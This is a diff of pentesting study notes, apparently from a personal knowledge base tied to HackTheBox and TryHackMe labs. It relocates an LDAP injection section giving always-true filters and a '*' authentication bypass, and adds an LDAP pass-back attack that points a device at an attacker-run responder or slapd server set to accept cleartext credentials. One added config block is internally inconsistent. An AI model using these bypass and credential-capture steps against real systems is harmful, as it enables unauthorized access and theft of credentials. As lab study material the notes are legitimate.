@@ -86,16 +86,6 @@ $ ldapsearch -h IP -x -b "dc=example,dc=com" -s sub "(&(objectclass=user))"
 
 <br>
 
-#### LDAP Injection
-
-[![attacking_common_applications](../../../cybersecurity/_badges/htb/attacking_common_applications.svg)](https://academy.hackthebox.com/course/preview/attacking-common-applications)
-[![ldap_injection_authentication](../../../cybersecurity/_badges/rootme/web_server/ldap_injection_authentication.svg)](https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-Authentication)
-
-Web applications using LDAP may be vulnerable to LDAP injection. These two expressions are always true: `(cn=*)` and `(objectClass=*)`.
-
-The most basic authentication bypass is `*` and `*` that authenticates as the first user found.
-</div><div>
-
 #### windapsearch command
 
 [![active_directory_enumeration_attacks](../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
@@ -112,6 +102,93 @@ $ python3 windapsearch.py --dc-ip IP -u xxx@example.com -p xxx [...]
 --da            # domain admins
 --members xxx   # members of group 'xxx'
 ```
+
+<br>
+
+#### LDAP Injection
+
+[![attacking_common_applications](../../../cybersecurity/_badges/htb/attacking_common_applications.svg)](https://academy.hackthebox.com/course/preview/attacking-common-applications)
+[![ldap_injection_authentication](../../../cybersecurity/_badges/rootme/web_server/ldap_injection_authentication.svg)](https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-Authentication)
+
+Web applications using LDAP may be vulnerable to LDAP injection. These two expressions are always true: `(cn=*)` and `(objectClass=*)`.
+
+The most basic authentication bypass is `*` and `*` that authenticates as the first user found.
+</div><div>
+
+### LDAP Pass-back Attack
+
+[![breachingad](../../../cybersecurity/_badges/thm/breachingad.svg)](https://tryhackme.com/r/room/breachingad)
+[![return](../../../cybersecurity/_badges/htb-p/return.svg)](https://app.hackthebox.com/machines/Return)
+
+LDAP Pass-back attack is possible when we have access to the LDAP configuration from a web interface of a device.
+
+We may be able to make the device send its LDAP requests to US by changing the LDAP server IP to ours.
+
+We can set up a [responder](/cybersecurity/red-team/tools/utilities/networking/responder.md), but it doesn't always work.
+
+```shell!
+$ sudo responder -I lo # and simulate a device sending cleartext credentials:
+$ ldapsearch -x -LLL -H ldap:// -D "bind_dn" -w "password" -b "base_dn" -s sub "(uid=username)"
+```
+
+Some devices may be vulnerable to downgrade attacks and can even send cleartext credentials. Responder *may not* be able to do that, so we may need to run our own LDAP server:
+
+```shell!
+$ sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
+$ sudo dpkg-reconfigure -p low slapd
+$ cat changes.lidf
+dn: cn=config
+changetype: modify
+replace: olcLogLevel
+olcSaslSecProps: noanonymous,minssf=0,passcred
+$ sudo ldapmodify -Y EXTERNAL -H ldapi:// -f changes.lidf
+$ sudo cat /etc/ldap/slapd.d/cn=config.ldif # OK?
+$ sudo service slapd restart
+$ sudo service slapd stop
+```
+
+<details class="details-n">
+<summary>LDAP Server On Docker</summary>
+
+We can use [docker-ldap](https://github.com/osixia/docker-openldap) <small>(3.9k ⭐)</small>, but I failed to configure it to only allow cleartext authentication.
+
+```dockerfile!
+FROM osixia/openldap
+
+ENV LDAP_ORGANISATION="My Organization" \
+    LDAP_DOMAIN="za.tryhackme.com" \
+    LDAP_ADMIN_PASSWORD="admin_password"
+
+# Import LDIF modifications
+ENV CONFIG_PATH="/container/service/slapd/assets/config/bootstrap/ldif"
+RUN rm -rf ${CONFIG_PATH}/*
+COPY config.ldif ${CONFIG_PATH}/01-config-password.ldif
+RUN echo "" > ${CONFIG_PATH}/02-security.ldif
+```
+
+As for `config.ldif`:
+
+```text!
+dn: cn=config
+changetype: modify
+add: olcSaslSecProps
+olcSaslSecProps: none
+olcSaslSecProps: noanonymous,minssf=0,passcred
+```
+
+Build with:
+
+```ps
+$ docker build . -t xxx:v0.01 --no-cache
+$ docker run --name xxx -p 389:389 -d xxx:v0.01
+```
+
+Test with:
+
+```ps
+$ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
+```
+</details>
 
 <br>
 
